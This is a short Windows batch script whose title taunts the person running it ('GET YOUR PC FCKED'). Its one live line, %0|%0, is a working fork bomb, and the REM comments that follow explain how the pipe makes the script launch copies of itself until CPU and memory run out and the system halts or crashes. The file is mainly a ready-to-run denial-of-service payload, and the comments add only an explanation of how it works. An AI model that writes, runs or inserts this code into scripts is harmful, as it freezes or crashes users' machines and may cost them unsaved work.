@ECHO OFF
TITLE GET YOUR PC FCKED!1!11!11 XDDDDDDDDDDD
REM ----------------------------------------

%0|%0

REM What it is:

REM %0|%0 is a fork bomb. It will spawn another process using a pipe | which runs a copy of the same program asynchronously. This hogs the CPU and memory, slowing down the system to a near-halt (or even crash the system).
REM How this works:
REM %0 refers to the command used to run the current program. For example, script.bat
REM A pipe | symbol will make the output or result of the first command sequence as the input for the second command sequence. In the case of a fork bomb, there is no output, so it will simply run the second command sequence without any input.
REM Expanding the example, %0|%0 could mean script.bat|script.bat. This runs itself again, but also creating another process to run the same program again (with no input).